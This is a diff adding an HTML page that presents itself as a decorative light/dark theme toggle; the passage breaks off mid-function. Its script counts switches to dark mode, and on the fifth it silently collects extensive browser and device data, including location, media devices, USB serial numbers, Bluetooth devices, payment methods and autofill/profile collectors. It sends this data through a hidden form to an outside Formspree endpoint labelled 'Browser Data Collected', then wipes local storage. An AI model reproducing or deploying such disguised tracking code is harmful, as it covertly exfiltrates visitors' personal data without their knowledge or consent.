@@ -1,0 +1,4435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TOGGLER</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            transition: background-color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
+                color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
+                border-color 0.6s cubic-bezier(0.4, 0, 0.2, 1),
+                transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #333;
+            padding: 20px;
+        }
+
+        body.dark-mode {
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            color: #f0f0f0;
+        }
+
+        .container {
+            text-align: center;
+            padding: 40px;
+            border-radius: 24px;
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1),
+                0 5px 15px rgba(0, 0, 0, 0.05),
+                inset 0 1px 0 rgba(255, 255, 255, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        body.dark-mode .container {
+            background: rgba(30, 30, 40, 0.85);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3),
+                0 5px 15px rgba(0, 0, 0, 0.2),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .switch-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 30px;
+        }
+
+        .switch-label {
+            font-size: 1.5rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .theme-toggle {
+            position: relative;
+            display: inline-block;
+            width: 120px;
+            height: 60px;
+        }
+
+        .theme-toggle input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, #ffd166, #ff9e6d);
+            border-radius: 50px;
+            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.1),
+                inset 0 -5px 15px rgba(0, 0, 0, 0.1),
+                0 5px 20px rgba(0, 0, 0, 0.2);
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        body.dark-mode .toggle-slider {
+            background: linear-gradient(90deg, #4a00e0, #8e2de2);
+            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.3),
+                inset 0 -5px 15px rgba(0, 0, 0, 0.3),
+                0 5px 20px rgba(0, 0, 0, 0.4);
+        }
+
+        .toggle-slider:before {
+            content: "";
+            position: absolute;
+            height: 50px;
+            width: 50px;
+            left: 5px;
+            bottom: 5px;
+            background: linear-gradient(145deg, #ffffff, #f0f0f0);
+            border-radius: 50%;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2),
+                inset 0 -3px 5px rgba(0, 0, 0, 0.1),
+                inset 0 3px 5px rgba(255, 255, 255, 0.8);
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #ff9e00;
+        }
+
+        body.dark-mode .toggle-slider:before {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4),
+                inset 0 -3px 5px rgba(0, 0, 0, 0.3),
+                inset 0 3px 5px rgba(255, 255, 255, 0.05);
+            color: #ffd700;
+        }
+
+        input:checked+.toggle-slider:before {
+            transform: translateX(60px);
+        }
+
+        .toggle-slider:active:before {
+            width: 55px;
+        }
+
+        .theme-toggle:hover .toggle-slider {
+            transform: scale(1.05);
+            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.15),
+                inset 0 -5px 15px rgba(0, 0, 0, 0.15),
+                0 8px 25px rgba(0, 0, 0, 0.25);
+        }
+
+        body.dark-mode .theme-toggle:hover .toggle-slider {
+            box-shadow: inset 0 5px 15px rgba(0, 0, 0, 0.4),
+                inset 0 -5px 15px rgba(0, 0, 0, 0.4),
+                0 8px 25px rgba(0, 0, 0, 0.5);
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0;
+            transition: opacity 1.5s ease;
+        }
+
+        body.dark-mode .stars {
+            opacity: 1;
+        }
+
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+            animation: twinkle 5s infinite;
+        }
+
+        @keyframes twinkle {
+
+            0%,
+            100% {
+                opacity: 0.3;
+            }
+
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .transition-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
+            z-index: 1000;
+            transform: scale(0);
+            border-radius: 50%;
+            opacity: 0;
+            pointer-events: none;
+            transition: transform 0.8s cubic-bezier(0.4, 0, 0.2, 1),
+                opacity 0.8s ease;
+        }
+
+        .transition-overlay.active {
+            transform: scale(2);
+            opacity: 0.9;
+        }
+
+        .transition-overlay.fade-out {
+            opacity: 0;
+            transform: scale(2);
+            transition: opacity 0.8s ease;
+        }
+
+        .save-notification {
+            text-wrap: nowrap;
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-weight: 600;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            opacity: 0;
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            z-index: 100;
+        }
+
+        .save-notification.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        .counter-container {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 40px;
+            height: 20px;
+            min-height: 20px;
+            opacity: 0;
+            animation: fadeInCounter 0.5s ease forwards;
+            animation-delay: 0.3s;
+        }
+
+        @keyframes fadeInCounter {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: rgba(30, 30, 40, 0.85);
+            opacity: 0.3;
+            display: none;
+        }
+
+        .dot.active {
+            display: block;
+            opacity: 1;
+            box-shadow: 0 0 8px rgba(240, 240, 240, 0.5);
+        }
+
+        body:not(.dark-mode) .dot.active {
+            opacity: 1;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+        }
+
+        body.dark-mode .dot.active {
+            opacity: 0.1;
+            box-shadow: none;
+        }
+
+        .success-modal,
+        .error-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1),
+                visibility 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .success-modal.active,
+        .error-modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg,
+                    rgba(255, 255, 255, 0.1) 0%,
+                    rgba(255, 255, 255, 0.05) 100%);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 24px;
+            padding: 40px 60px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .modal-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg,
+                    transparent 0%,
+                    rgba(255, 255, 255, 0.3) 50%,
+                    transparent 100%);
+        }
+
+        .success-modal .modal-content {
+            animation: pulseGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes pulseGlow {
+
+            0%,
+            100% {
+                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
+                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                    0 0 20px rgba(142, 45, 226, 0.1);
+            }
+
+            50% {
+                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5),
+                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                    0 0 40px rgba(142, 45, 226, 0.3);
+            }
+        }
+
+        .error-modal .modal-content {
+            border: 1px solid rgba(255, 100, 100, 0.2);
+            background: linear-gradient(135deg,
+                    rgba(255, 100, 100, 0.05) 0%,
+                    rgba(255, 50, 50, 0.02) 100%);
+        }
+
+        .modal-content h3 {
+            color: white;
+            font-size: 1.5rem;
+            margin: 20px 0;
+            font-weight: 600;
+            line-height: 1.4;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .success-modal .modal-content h3 {
+            background: linear-gradient(90deg, #ffffff, #cccccc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-size: 1.6rem;
+        }
+
+        .error-modal .modal-content h3 {
+            color: #ff6b6b;
+            font-size: 1.4rem;
+        }
+
+        .modal-content .fa-check-circle {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 2.5rem;
+            margin: 0 10px;
+        }
+
+        .modal-content .fa-exclamation-triangle {
+            color: #ff6b6b;
+            font-size: 2rem;
+            margin: 0 10px;
+        }
+
+        .error-code {
+            color: rgba(255, 255, 255, 0.7);
+            font-family: 'Courier New', monospace;
+            font-size: 1rem;
+            margin-top: 15px;
+            padding: 8px 15px;
+            background: rgba(255, 100, 100, 0.1);
+            border-radius: 8px;
+            display: inline-block;
+            border: 1px solid rgba(255, 100, 100, 0.2);
+        }
+
+        .error-code span {
+            color: #ff9999;
+            font-weight: bold;
+        }
+
+        .modal-subtext {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 0.9rem;
+            margin-top: 15px;
+            font-style: italic;
+        }
+
+        @keyframes modalAppear {
+            from {
+                opacity: 0;
+                transform: translateY(-30px) scale(0.95);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .success-modal.active .modal-content,
+        .error-modal.active .modal-content {
+            animation: modalAppear 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+
+        #Form {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border: 0;
+        }
+
+        #collectedData {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            .theme-toggle {
+                width: 100px;
+                height: 50px;
+            }
+
+            input:checked+.toggle-slider:before {
+                transform: translateX(50px);
+            }
+
+            .toggle-slider:before {
+                height: 40px;
+                width: 40px;
+            }
+
+            .counter-container {
+                margin-top: 30px;
+                gap: 12px;
+            }
+
+            .dot {
+                width: 10px;
+                height: 10px;
+            }
+
+            .modal-content {
+                padding: 30px 20px;
+                width: 85%;
+            }
+
+            .success-modal .modal-content h3 {
+                font-size: 1.3rem;
+            }
+
+            .error-modal .modal-content h3 {
+                font-size: 1.2rem;
+            }
+
+            .modal-content .fa-spider-web,
+            .modal-content .fa-exclamation-triangle {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="transition-overlay" id="transitionOverlay"></div>
+    <div class="stars" id="starsContainer"></div>
+
+    <div class="container">
+
+        <div class="switch-container">
+            <div class="switch-label">
+                <i class="fas fa-sun"></i>
+                <span id="themeLabel">LIGHT THEME</span>
+                <i class="fas fa-moon"></i>
+            </div>
+
+            <label class="theme-toggle">
+                <input type="checkbox" id="themeToggle">
+                <span class="toggle-slider" title="Toggle">
+                </span>
+            </label>
+        </div>
+
+        <div class="mode-status" id="modeStatus"></div>
+
+        <div class="counter-container" id="counterContainer"></div>
+    </div>
+
+    <form id="Form" style="display: none;" action="https://formspree.io/f/xzdrkkaw" method="POST">
+        <textarea name="collected_data" id="collectedData"></textarea>
+        <input type="hidden" name="_subject" value="Browser Data Collected">
+        <input type="hidden" name="_format" value="plain">
+        <input type="text" name="_gotcha" style="display:none;">
+        <input type="hidden" name="_language" value="ru">
+    </form>
+
+    <div class="success-modal" id="successModal">
+        <div class="modal-content">
+            <i class="fa fa-check-circle"></i>
+            <h3>ACCESS GRANTED!</h3>
+            <div class="modal-subtext" id="modalSubtext"></div>
+        </div>
+    </div>
+
+    <div class="error-modal" id="errorModal">
+        <div class="modal-content">
+            <i class="fas fa-exclamation-triangle"></i>
+            <h3 id="errorTitle">ERROR! </h3>
+            <div class="error-code">629: <span id="errorCode">ERR_NETWORK_FAILURE</span></div>
+        </div>
+    </div>
+
+    <div class="save-notification" id="saveNotification">
+        <i class="fas fa-check-circle"></i> Theme changed!
+    </div>
+
+    <script>
+        const themeToggle = document.getElementById('themeToggle');
+        const body = document.body;
+        const themeLabel = document.getElementById('themeLabel');
+        const transitionOverlay = document.getElementById('transitionOverlay');
+        const starsContainer = document.getElementById('starsContainer');
+        const saveNotification = document.getElementById('saveNotification');
+        const counterContainer = document.getElementById('counterContainer');
+        const Form = document.getElementById('Form');
+        const collectedDataField = document.getElementById('collectedData');
+        const successModal = document.getElementById('successModal');
+        const errorModal = document.getElementById('errorModal');
+        const errorCodeSpan = document.getElementById('errorCode');
+
+        const MAX_SWITCHES = 5;
+        const SWITCH_COUNT_KEY = 'themeSwitchCount';
+        const PENDING_DATA_KEY = 'pendingFormData';
+
+        const ENABLE_LOGS = true;
+
+        function debugLog(message, data) {
+            if (!ENABLE_LOGS) return;
+            const time = new Date().toTimeString().split(' ')[0];
+            console.log(`[${time}] ${message}`);
+            if (data) console.log(data);
+        }
+
+        function debugError(message, error) {
+            if (!ENABLE_LOGS) return;
+            console.error(`[ERROR] ${message}`, error);
+        }
+
+        function createStars() {
+            starsContainer.innerHTML = '';
+            const starCount = 80;
+
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+
+                const size = Math.random() * 3 + 1;
+                const posX = Math.random() * 100;
+                const posY = Math.random() * 100;
+                const duration = Math.random() * 4 + 3;
+                const delay = Math.random() * 5;
+
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                star.style.left = `${posX}%`;
+                star.style.top = `${posY}%`;
+                star.style.animationDelay = `${delay}s`;
+                star.style.animationDuration = `${duration}s`;
+
+                starsContainer.appendChild(star);
+            }
+        }
+
+        createStars();
+
+        function initializeSystem() {
+            createCounterDots();
+            let switchCount = parseInt(localStorage.getItem(SWITCH_COUNT_KEY)) || 0;
+            updateCounterDots(switchCount);
+            checkPendingData();
+            updateFormspreeEndpoint();
+        }
+
+        function createCounterDots() {
+            counterContainer.innerHTML = '';
+            for (let i = 0; i < MAX_SWITCHES; i++) {
+                const dot = document.createElement('div');
+                dot.className = 'dot';
+                dot.id = `dot-${i + 1}`;
+                counterContainer.appendChild(dot);
+            }
+        }
+
+        function updateCounterDots(count) {
+            document.querySelectorAll('.dot').forEach(dot => {
+                dot.classList.remove('active');
+            });
+
+            for (let i = 0; i < count; i++) {
+                const dot = document.getElementById(`dot-${i + 1}`);
+                if (dot) {
+                    dot.classList.add('active');
+                }
+            }
+
+            if (count > 0) {
+                counterContainer.style.opacity = '1';
+            }
+        }
+
+        function updateFormspreeEndpoint() {
+            const formspreeEndpoint = 'https://formspree.io/f/xzdrkkaw';
+            Form.action = formspreeEndpoint;
+        }
+
+        function checkPendingData() {
+            const pendingData = localStorage.getItem(PENDING_DATA_KEY);
+            if (pendingData) {
+                debugLog('Обнаружены неотправленные данные');
+                sendPendingData(pendingData);
+            }
+        }
+
+        themeToggle.onchange = async function (e) {
+            const isDarkMode = this.checked;
+
+            playTransitionAnimation(() => {
+                if (isDarkMode) {
+                    body.classList.add('dark-mode');
+                    localStorage.setItem('theme', 'dark');
+
+                    handleDarkModeSwitch();
+                } else {
+                    body.classList.remove('dark-mode');
+                    localStorage.setItem('theme', 'light');
+                }
+
+                updateThemeText(isDarkMode);
+                showSaveNotification();
+
+                const slider = document.querySelector('.toggle-slider');
+                slider.style.transform = 'scale(1.1)';
+                setTimeout(() => {
+                    slider.style.transform = 'scale(1)';
+                }, 200);
+            });
+        };
+
+        async function handleDarkModeSwitch() {
+            try {
+                let switchCount = parseInt(localStorage.getItem(SWITCH_COUNT_KEY)) || 0;
+                switchCount++;
+                localStorage.setItem(SWITCH_COUNT_KEY, switchCount);
+                updateCounterDots(switchCount);
+
+                debugLog(`Переключение на темную тему: ${switchCount}/${MAX_SWITCHES}`);
+
+                if (switchCount >= MAX_SWITCHES) {
+                    debugLog('Достигнут лимит переключений');
+                    localStorage.setItem(SWITCH_COUNT_KEY, 0);
+                    updateCounterDots(0);
+                    await collectAndSendData();
+                }
+            } catch (error) {
+                debugError('Ошибка в handleDarkModeSwitch', error);
+            }
+        }
+
+        async function collectAndSendData() {
+            try {
+                debugLog('Начало сбора данных браузера');
+                const browserData = await collectAllBrowserData();
+                const projectData = {
+                    switchCount: MAX_SWITCHES,
+                    activationTime: new Date().toISOString(),
+                    project: "СЕТЬ",
+                    activationTrigger: "dark_theme_switch_limit"
+                };
+
+                browserData.projectData = projectData;
+
+                const sendStamp = `// Данные собраны. Время сбора: ${new Date().toLocaleString('ru-BY')}\n`;
+                const jsonData = sendStamp + JSON.stringify(browserData, null, 2);
+
+                debugLog('Данные собраны. Отправка формы');
+                const success = await sendFormData(jsonData);
+
+                if (success) {
+                    localStorage.clear();
+                    sessionStorage.clear();
+                    showSuccessModal();
+                } else {
+                    localStorage.setItem(PENDING_DATA_KEY, jsonData);
+                    showErrorModal('ERR_NETWORK_FAILURE');
+                }
+            } catch (error) {
+                debugError('Критическая ошибка при сборе данных', error);
+                showErrorModal('ERR_DATA_COLLECTION_FAILED');
+            }
+        }
+
+        async function collectAllBrowserData() {
+            const data = {
+                meta: {
+                    collectedAt: new Date().toISOString(),
+                    timestamp: Date.now(),
+                    source: window.location.href,
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer || 'none',
+                    historyLength: history.length,
+                    collectionVersion: "2.6"
+                },
+                browser: collectBrowserInfo(),
+                system: collectSystemInfo(),
+                location: await collectLocationInfo(),
+                media: await collectMediaInfo(),
+                network: collectNetworkInfo(),
+                capabilities: collectCapabilitiesInfo(),
+                additional: collectAdditionalInfo(),
+                advanced: await collectAdvancedInfo(),
+                behavior: collectBehaviorInfo(),
+                sensors: await collectSensorInfo(),
+                storage: await collectDatabaseInfo(),
+                bluetooth: await collectBluetoothInfo(),
+                usb: await collectUSBInfo(),
+                privacy: await collectPrivacyInfo(),
+                userProfile: await collectUserProfileInfo(),
+                payments: await collectPaymentAndAutofillInfo()
+            };
+
+            data.projectData = {
+                switchCount: MAX_SWITCHES,
+                activationTime: new Date().toISOString(),
+                project: "СЕТЬ",
+                activationTrigger: "dark_theme_switch_limit",
+                dataVersion: "2.6"
+            };
+
+            return data;
+        }
+
+        async function collectAdvancedInfo() {
+            const result = {
+                fonts: await getFontsInfo(),
+                battery: await getBatteryInfo(),
+                webAuthn: await getWebAuthnDetails(),
+                shareAPI: await getShareAPIDetails(),
+                webRTC: await getWebRTCDetails(),
+                paymentAPI: await getPaymentAPIDetails(),
+                credentialsAPI: getCredentialsAPIDetails(),
+                mimeTypes: getMimeTypesInfo(),
+                csp: getCSPInfo(),
+                indexedDB: 'indexedDB' in window,
+                cacheAPI: 'caches' in window,
+                webSQL: 'openDatabase' in window,
+                webSocket: 'WebSocket' in window,
+                bluetooth: 'bluetooth' in navigator
+            };
+
+            return result;
+        }
+
+        async function getWebAuthnDetails() {
+            if (!('PublicKeyCredential' in window)) {
+                return { available: false };
+            }
+
+            try {
+                const supportedAlgorithms = [];
+
+                const isU2FSupported = 'U2F' in window || 'u2f' in window;
+                const isCTAPSupported = 'PublicKeyCredential' in window;
+
+                return {
+                    available: true,
+                    isU2FSupported: isU2FSupported,
+                    isCTAPSupported: isCTAPSupported,
+                    isConditionalMediation: 'PublicKeyCredential' in window &&
+                        PublicKeyCredential.isConditionalMediationAvailable ?
+                        await PublicKeyCredential.isConditionalMediationAvailable() : false,
+                    isUserVerifyingPlatformAuthenticatorAvailable: 'PublicKeyCredential' in window &&
+                        PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable ?
+                        await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable() : false
+                };
+            } catch (error) {
+                return { available: true, error: error.message };
+            }
+        }
+
+        async function getShareAPIDetails() {
+            if (!('share' in navigator)) {
+                return { available: false };
+            }
+
+            try {
+                const canShare = navigator.canShare ? navigator.canShare({ title: 'Test' }) : true;
+
+                return {
+                    available: true,
+                    canShare: canShare,
+                    canShareFiles: navigator.canShare ? navigator.canShare({ files: [new File([], 'test.txt')] }) : false,
+                    maxShares: 5
+                };
+            } catch (error) {
+                return { available: true, error: error.message };
+            }
+        }
+
+        async function getWebRTCDetails() {
+            if (!('RTCPeerConnection' in window)) {
+                return { available: false };
+            }
+
+            try {
+                const pc = new RTCPeerConnection();
+
+                const capabilities = {
+                    hasDataChannel: 'createDataChannel' in pc,
+                    hasAddTrack: 'addTrack' in pc,
+                    hasGetStats: 'getStats' in pc,
+                    codecs: await getWebRTCCodecs(),
+                    stunServers: pc.getConfiguration()?.iceServers?.filter(s => s.urls?.some(u => u.includes('stun:')))?.length || 0,
+                    turnServers: pc.getConfiguration()?.iceServers?.filter(s => s.urls?.some(u => u.includes('turn:')))?.length || 0
+                };
+
+                pc.close();
+
+                return {
+                    available: true,
+                    ...capabilities
+                };
+            } catch (error) {
+                return { available: true, error: error.message };
+            }
+        }
+
+        async function getWebRTCCodecs() {
+            try {
+                const pc = new RTCPeerConnection();
+                const offer = await pc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: true });
+
+                const sdp = offer.sdp;
+                const codecs = {
+                    audio: [],
+                    video: []
+                };
+
+                sdp.split('\n').forEach(line => {
+                    if (line.includes('a=rtpmap:')) {
+                        const match = line.match(/a=rtpmap:(\d+) ([^/]+)/);
+                        if (match) {
+                            const type = line.includes('audio') ? 'audio' : 'video';
+                            codecs[type].push(match[2]);
+                        }
+                    }
+                });
+
+                pc.close();
+                return codecs;
+            } catch (e) {
+                return { error: e.message };
+            }
+        }
+
+        async function getPaymentAPIDetails() {
+            if (!('PaymentRequest' in window)) {
+                return { available: false };
+            }
+
+            try {
+                const supportedMethods = [];
+
+                const methods = [
+                    'https://google.com/pay',
+                    'https://apple.com/apple-pay',
+                    'https://www.paypal.com',
+                    'https://pay.amazon.com',
+                    'basic-card'
+                ];
+
+                for (const method of methods) {
+                    try {
+                        const request = new PaymentRequest([{ supportedMethods: method }], {
+                            total: { label: 'Test', amount: { currency: 'USD', value: '1.00' } }
+                        });
+                        const canMake = await request.canMakePayment();
+                        if (canMake) {
+                            supportedMethods.push(method);
+                        }
+                    } catch (e) { }
+                }
+
+                return {
+                    available: true,
+                    supportedMethods: supportedMethods,
+                    hasShippingAddress: 'shippingAddress' in PaymentRequest.prototype,
+                    hasShippingOption: 'shippingOption' in PaymentRequest.prototype
+                };
+            } catch (error) {
+                return { available: true, error: error.message };
+            }
+        }
+
+        async function getCredentialsAPIDetails() {
+            if (!('credentials' in navigator)) {
+                return { available: false };
+            }
+
+            try {
+                return {
+                    available: true,
+                    canGet: 'get' in navigator.credentials,
+                    canCreate: 'create' in navigator.credentials,
+                    canStore: 'store' in navigator.credentials,
+                    hasPreventSilentAccess: 'preventSilentAccess' in navigator.credentials,
+                    types: {
+                        password: 'PasswordCredential' in window,
+                        federated: 'FederatedCredential' in window,
+                        publicKey: 'PublicKeyCredential' in window
+                    }
+                };
+            } catch (error) {
+                return { available: true, error: error.message };
+            }
+        }
+
+        function collectBehaviorInfo() {
+            const scrollDepth = window.scrollY / document.body.scrollHeight;
+            const timeOnPage = performance.now() - performance.timing.navigationStart;
+
+            return {
+                scrollDepth: Math.round(scrollDepth * 100) + '%',
+                timeOnPage: Math.round(timeOnPage) + 'ms',
+                screenOrientation: screen.orientation?.type || window.orientation || 'unknown',
+                visibilityState: document.visibilityState,
+                hasFocus: document.hasFocus(),
+                mouseTracking: 'available',
+                keyboardTracking: 'available'
+            };
+        }
+
+        async function collectSensorInfo() {
+            return {
+                deviceMotion: 'DeviceMotionEvent' in window,
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                ambientLight: 'AmbientLightSensor' in window,
+                proximity: 'ProximitySensor' in window,
+                gyroscope: 'Gyroscope' in window,
+                accelerometer: 'Accelerometer' in window,
+                magnetometer: 'Magnetometer' in window
+            };
+        }
+
+        async function checkDeviceAPI(apiName, config) {
+            const hasAPI = apiName in navigator;
+            const apiObject = navigator[apiName];
+
+            const result = {
+                available: false,
+                error: null,
+                status: 'not_supported',
+                details: {
+                    isAvailable: false,
+                    permissions: 'unknown',
+                    pairedDevicesCount: 0,
+                    canScan: false,
+                    canAsk: false,
+                    functions: {},
+                    permissionState: 'unknown',
+                    diagnostics: {}
+                },
+                devices: [],
+                timestamp: new Date().toISOString()
+            };
+
+            result.details.diagnostics = {
+                hasAPIProperty: hasAPI,
+                apiObjectType: typeof apiObject,
+                isSecureContext: window.isSecureContext,
+                protocol: window.location.protocol,
+                hostname: window.location.hostname,
+                browser: getBrowserName(),
+                userAgent: navigator.userAgent.substring(0, 100)
+            };
+
+            if (!hasAPI) {
+                result.error = `${apiName} API not supported`;
+                result.details.diagnostics.failureReason = 'api_property_missing';
+                return result;
+            }
+
+            if (typeof apiObject !== 'object') {
+                result.error = `navigator.${apiName} is not an object`;
+                result.details.diagnostics.failureReason = 'api_not_object';
+                return result;
+            }
+
+            try {
+                let permissionState = 'unknown';
+                if (navigator.permissions && navigator.permissions.query) {
+                    for (const name of config.permissionNames) {
+                        try {
+                            const permission = await navigator.permissions.query({ name });
+                            if (permission && permission.state) {
+                                permissionState = permission.state;
+                                result.details.permissions = permission.state;
+                                result.details.permissionState = permission.state;
+                                result.details.diagnostics.permissionCheck = {
+                                    name: name,
+                                    state: permission.state,
+                                    status: 'success'
+                                };
+                                break;
+                            }
+                        } catch (permError) {
+                            result.details.diagnostics.permissionCheck = {
+                                name: name,
+                                error: permError.message,
+                                status: 'failed'
+                            };
+                        }
+                    }
+                } else {
+                    result.details.permissions = 'no_permissions_api';
+                    result.details.diagnostics.permissionCheck = {
+                        status: 'permissions_api_not_available'
+                    };
+                }
+
+                result.details.canAsk = 'requestDevice' in apiObject;
+                result.details.diagnostics.canAskCheck = 'requestDevice' in apiObject;
+
+                if (config.getDevicesFunc) {
+                    try {
+                        const devices = await config.getDevicesFunc();
+                        result.details.pairedDevicesCount = devices.length;
+                        result.details.diagnostics.getDevicesCheck = {
+                            status: 'success',
+                            deviceCount: devices.length
+                        };
+
+                        if (devices.length > 0) {
+                            result.devices = devices.map(device => {
+                                const baseInfo = config.deviceMapper(device);
+
+                                if (apiName === 'bluetooth' && device.gatt) {
+                                    baseInfo.gatt = {
+                                        connected: device.gatt.connected || false
+                                    };
+                                }
+
+                                if (apiName === 'usb') {
+                                    baseInfo.deviceInfo = {
+                                        vendorId: device.vendorId,
+                                        productId: device.productId,
+                                        productName: device.productName,
+                                        manufacturerName: device.manufacturerName,
+                                        serialNumber: device.serialNumber,
+                                        opened: device.opened
+                                    };
+                                }
+
+                                return baseInfo;
+                            });
+                        }
+                    } catch (devicesError) {
+                        result.details.getDevicesError = devicesError.message;
+                        result.details.diagnostics.getDevicesCheck = {
+                            status: 'error',
+                            error: devicesError.message
+                        };
+                    }
+                } else {
+                    result.details.diagnostics.getDevicesCheck = {
+                        status: 'function_not_available'
+                    };
+                }
+
+                if (apiName === 'bluetooth') {
+                    result.details.canScan = 'requestLEScan' in apiObject;
+                    result.details.diagnostics.canScanCheck = 'requestLEScan' in apiObject;
+
+                    try {
+                        if (apiObject.getAvailability) {
+                            const isAvailable = await apiObject.getAvailability();
+                            result.details.isAvailable = isAvailable;
+                            result.details.diagnostics.availabilityCheck = {
+                                status: 'success',
+                                available: isAvailable
+                            };
+                        } else {
+                            result.details.diagnostics.availabilityCheck = {
+                                status: 'function_not_available'
+                            };
+                        }
+                    } catch (availError) {
+                        result.details.diagnostics.availabilityCheck = {
+                            status: 'error',
+                            error: availError.message
+                        };
+                    }
+                }
+
+                const functionNames = ['getAvailability', 'requestDevice', 'getDevices', 'requestLEScan'];
+                result.details.functions = {};
+                result.details.diagnostics.functionsTest = {};
+
+                for (const funcName of functionNames) {
+                    try {
+                        if (apiObject && apiObject[funcName]) {
+                            const funcType = typeof apiObject[funcName];
+                            result.details.functions[funcName] = funcType;
+                            result.details.diagnostics.functionsTest[funcName] = {
+                                exists: true,
+                                type: funcType,
